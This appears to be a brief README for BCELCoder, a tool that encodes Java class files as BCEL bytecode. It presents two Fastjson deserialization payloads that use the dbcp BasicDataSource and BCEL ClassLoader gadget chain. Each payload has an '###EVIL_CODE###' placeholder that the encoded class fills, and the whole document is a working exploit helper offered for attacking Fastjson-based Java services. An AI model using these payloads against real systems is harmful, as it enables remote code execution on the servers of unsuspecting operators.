# BCELCoder
Used for Fastjson Bcel bytecode（用于fastjson bcel 字节码编码）


Used:  java -jar fastjson-BCELCode.jar  -e  xxxxxxx.class


附上fastjson payload：
```
{"@type":"org.apache.commons.dbcp.BasicDataSource","driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName":"###EVIL_CODE###"}
```
```
{{"@type":"com.alibaba.fastjson.JSONObject","c":{"@type":"org.apache.commons.dbcp.BasicDataSource","driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName":"###EVIL_CODE###"}}:"ddd"
```
